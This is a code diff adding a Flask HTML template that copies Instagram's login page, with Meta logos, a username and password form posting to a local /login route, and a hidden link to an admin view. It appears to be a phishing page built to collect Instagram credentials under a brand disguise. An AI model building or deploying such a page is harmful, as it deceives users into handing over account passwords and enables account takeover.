@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+    <!-- Yuqori qism: Strelka va Meta logotipi -->
+    <header>
+        <div class="header-container">
+            <a class="back-btn" href="javascript:history.back()">
+                <img src="{{ url_for('static', filename='logo1.png') }}" alt="Back">
+            </a>
+            <div class="meta-wrapper">
+                <a href="{{ url_for('admin') }}"><img class="meta-logo" src="{{ url_for('static', filename='Meta-Logo.png') }}" alt="Meta Logo"></a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Flash xabarlar -->
+    {% with messages = get_flashed_messages() %}
+      {% if messages %}
+        <div class="flash-messages" style="text-align: center; margin-top: 10px;">
+          {% for message in messages %}
+            <p style="color: #ed4956; font-size: 14px; font-weight: 600;">{{ message }}</p>
+          {% endfor %}
+        </div>
+      {% endif %}
+    {% endwith %}
+
+    <!-- Asosiy forma qismi -->
+    <form action="/login" method="POST" class="login-container">
+        <div class="input-group">
+            <input type="text" name="username" placeholder="Username, email or mobile number" required>
+            <input type="password" name="password" placeholder="Password" required>
+        </div>
+
+        <div class="button-group">
+            <button type="submit" class="login-btn">Log in</button>
+            <a href="/forgot.html" class="forgot-btn" style="text-align: center; text-decoration: none; display: block;">Forgot Password?</a>
+        </div>
+    </form>
+
+    <!-- Pastki tugma (Create new account) -->
+    <footer class="footer-container">
+        <a href="/create.html" class="create-btn" style="text-align: center; text-decoration: none; display: flex; align-items: center; justify-content: center;">Create new account</a>
+    </footer>
+
+</body>
+</html>
